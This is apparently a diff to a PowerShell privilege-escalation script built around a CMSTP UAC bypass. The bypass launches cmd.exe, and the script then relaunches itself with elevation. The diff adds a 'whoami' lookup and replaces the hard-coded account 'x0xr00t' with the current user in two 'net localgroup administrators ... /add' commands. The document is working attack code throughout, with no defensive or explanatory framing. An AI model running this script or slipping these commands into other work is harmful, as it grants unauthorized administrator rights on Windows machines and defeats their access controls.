@@ -9,6 +9,7 @@
 # 
 # Usage  : run the .ps1 file. 
 
+$user= whoami
 write-Host ""
 write-Host ""
 write-Host ""
@@ -56,7 +57,7 @@ switch ($OSVersion)
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         # Add User to ADMIN Group 
-        net localgroup administrators x0xr00t /add
+        net localgroup administrators $user /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
@@ -95,7 +96,7 @@ switch ($OSVersion)
 
         [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe") 
         # Add User to ADMIN Group 
-        net localgroup administrators x0xr00t /add
+        net localgroup administrators $user /add
         If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
         {
         # Relaunch as an elevated process:
